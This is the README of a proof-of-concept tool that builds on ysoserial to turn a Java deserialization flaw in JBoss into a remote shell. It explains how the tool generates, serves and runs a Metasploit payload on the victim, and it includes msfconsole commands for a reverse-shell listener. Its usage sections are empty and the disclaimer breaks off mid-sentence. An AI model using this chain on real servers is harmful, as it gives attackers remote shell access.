# Java Deserialization Exploit

A proof-of-concept tool which weaponizes frohoff's original ysoserial code to gain a remote shell.

## Description

This tool builds upon the proof-of-concept ysoserial by Chris Frohoff (https://github.com/frohoff/ysoserial) and exploits
the vulnerability, using Metasploit Framework tools to generate a malicious binary and an embedded web server to transfer
the payload to the victim. A slightly modified version of ysoserial is used to download and execute the binary on the
victim's side.

__Note:__ This tool is still in an early stage of development, and many features have not yet been implemented. Only the
JBoss platform is currently exploitable.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be

## Usage

Coming soon.

## Examples

Coming soon.


## Requirements

1. Metasploit Framework -- You must have a listener running in msfconsole before running this exploit. Example:
```shell
# msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload linux/x86/shell/reverse_tcp
msf exploit(handler) > set LHOST <local ip>
msf exploit(handler) > set LPORT <local port>
msf exploit(handler) > exploit
```

2. msfvenom must be installed and available in your PATH. This command is used to generate the reverse shell payload.

## Installation
